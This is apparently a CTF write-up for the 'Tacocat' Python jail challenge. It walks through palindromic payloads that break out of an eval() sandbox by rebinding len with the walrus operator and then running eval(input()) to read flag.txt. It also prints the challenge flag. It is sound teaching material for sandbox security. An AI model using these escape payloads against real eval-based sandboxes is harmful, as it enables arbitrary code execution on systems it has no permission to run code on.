---
title: Tacocat
date: 2024-01-05T22:50:30+01:00
description: Writeup for Tacocat [37c3 Potluckctf 2023]
author: zenbassi
tags:
- misc
- python escape
draft: false
---
___

## Challenge Description

This is an upsolve, so I don't really remember, but it went something like _We
had no good ideas but we figured a python escape is always welcome_.

## Intuition

The code for the jail is given to us and albeit, very short:

```python
while True:
    x = input("palindrome? ")
    assert "#" not in x, "comments are bad"
    assert all(ord(i) < 128 for i in x), "ascii only kthx"
    assert x == x[::-1], "not a palindrome"
    assert len(x) < 36, "palindromes can't be more than 35 characters long, this is a well known fact."
    assert sum(x.encode()) % 256 == 69, "not nice!"
    eval(x)
```

So, we're free to give a string to `eval`, which will _evaluate_ any valid python expression.
This can give us the flag, or a shell, but the catch is that:
* the input must be a palindrome
* we cannot use comments
* sum of ASCII values for each character in the input has to be equal to 69 (modulo 256)

I had multiple ideas, including using string formatting to insert comments,
using tuples which are evaluated element by element and to use triple quotes
strings as a form of comment. Sadly I had no success with any of them, but I'm
happy to see that some of my ideas were in a solution by `pspaul @
[FluxFingers](https://fluxfingers.net/)`, which I we will discuss below.

## Solution

The solution consists of multiple inputs formatted as such:

```
      +------------------------------------------------------+
      |                                                      |
      |              +-----------------------+               |
      |              |                       |               |
      v              v                       v               v
'''{buffer}',{reverse(expression)},''',{expression},'{reverse(buffer)}'''
|                                    | |       ^  | |                 | ^
|          this is a string          | |       |  | | this is a char  | |
+------------------------------------+ +-------+--+ +-------------^---+ |
                                               |                  |     |
     this is the evaluated expression ---------+                  |     |
                                                                  |     |
                   this is used to reach the desired sum ---------+     |
                                                                        |
                                                                        |
                                                                        |
                                                         empty string --+

eg. which would print 42 when evaluated:

eval("'''?',))24(tnirp(,''',(print(42)),'?'''")

This is a bit too long to be valid, but you get the point :P
```

Looking at it, this is a very neat way of abusing the greedy way in which
strings are evaluated in python - from left to right.

Now, the length restriction is problematic. We can bypass it if we assign
to `len` another function that processes a string or a list and returns a
values smaller than 36. Such functions are `all` or `any`. To achieve the
substitution we can utilise the `walrus operator` introduced in python 3.8 [^1].
The following two lines bypass the length check:

```python
'''k',)yna=:y(,''',(y:=any),'k'''
'''t',)y=:nel(,''',(len:=y),'t'''
```

Lastly we can just read the flag with:

```python
'''{}',))(tupni(lave,''',eval(input()),'{}'''
```

and then supplying something such as:

```python
print(open("flag.txt").read())
```

### Flag

`POTLUCK{1_@c7u@11y_do_n07_kn0w_th3_f1@g}`

## References

[^1]: https://docs.python.org/3/whatsnew/3.8.html
